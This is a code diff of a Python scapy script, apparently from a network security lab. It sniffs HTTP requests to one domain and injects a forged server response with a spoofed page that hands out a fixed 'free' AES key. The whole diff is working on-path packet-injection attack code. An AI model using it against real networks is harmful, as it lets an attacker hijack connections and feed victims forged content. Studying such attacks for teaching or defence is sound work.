@@ -3,7 +3,6 @@
 import scapy
 from scapy.layers.http import HTTPResponse, HTTPRequest
 import scapy.packet as packet
-import urllib.parse as parse
 from scapy.all import *
 from scapy.utils import *
 
@@ -32,16 +31,19 @@ def handle_pkt(pkt):
         if host != 'freeaeskey.xyz':
             return
 
+        # Get packet layers
         ether = Ether(pkt)
         ip_layer = ether[IP]
         tcp_layer = ether[TCP]
 
+        # Get information from IP layer
         source = ip_layer.src
         destination = ip_layer.dst
         time_to_live = ip_layer.ttl
 
         print("Source: {}, Destination: {}, Time: {}".format(source, destination, time_to_live))
 
+        # Get information from tcp layer
         sequence_number = tcp_layer.seq
         acknowledgement = tcp_layer.ack
         source_port = tcp_layer.sport
@@ -50,19 +52,24 @@ def handle_pkt(pkt):
 
         print("Sequence Number: {}, Ack number: {}, Source port: {}, Destination port: {}".format(sequence_number, acknowledgement, source_port, dest_port))
 
-        spoof_http_layer = HTTPResponse()
-        
+        # Construct http layer
+        payload="""<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>"""
+        separator = "\x0d\x0a"
+        http_head = "HTTP/1.1 200 OK"
+        date="Date: " + time.strftime("%a, %d %Y %T GMT+7")
+        content_Type="Content-Type: text/html; charset=UTF-8"
+        content_Length="Content-Length: " + str(len(payload))
+
+        http_data = [http_head, date, content_Type, content_Length, separator]
+        spoof_http_layer = separator.join(http_data)
+
+        # Construct the tcp and ip layers
         spoof_ack = sequence_number + len(spoof_http_layer)
-        spoof_ip_layer = IP(dst="1.2.3.4", src=destination, ttl=time_to_live)
+        spoof_ip_layer = IP(dst=source, src=destination, ttl=time_to_live)
         spoof_tpc_layer = TCP(seq=acknowledgement, sport=dest_port, dport=source_port, ack=spoof_ack, flags=flags)
 
-        print("Content Length: {}".format(len(http_packet)))
-
-        # LEft off where we don't really know how to get wireshark to recognise the 
-        # http response as an http protocol
-
-        packet = spoof_ip_layer/spoof_tpc_layer/spoof_http_layer
-        print(packet.show())
+        # Build entire packet
+        packet = spoof_ip_layer/spoof_tpc_layer/spoof_http_layer/payload
 
         inject_pkt(packet)
 
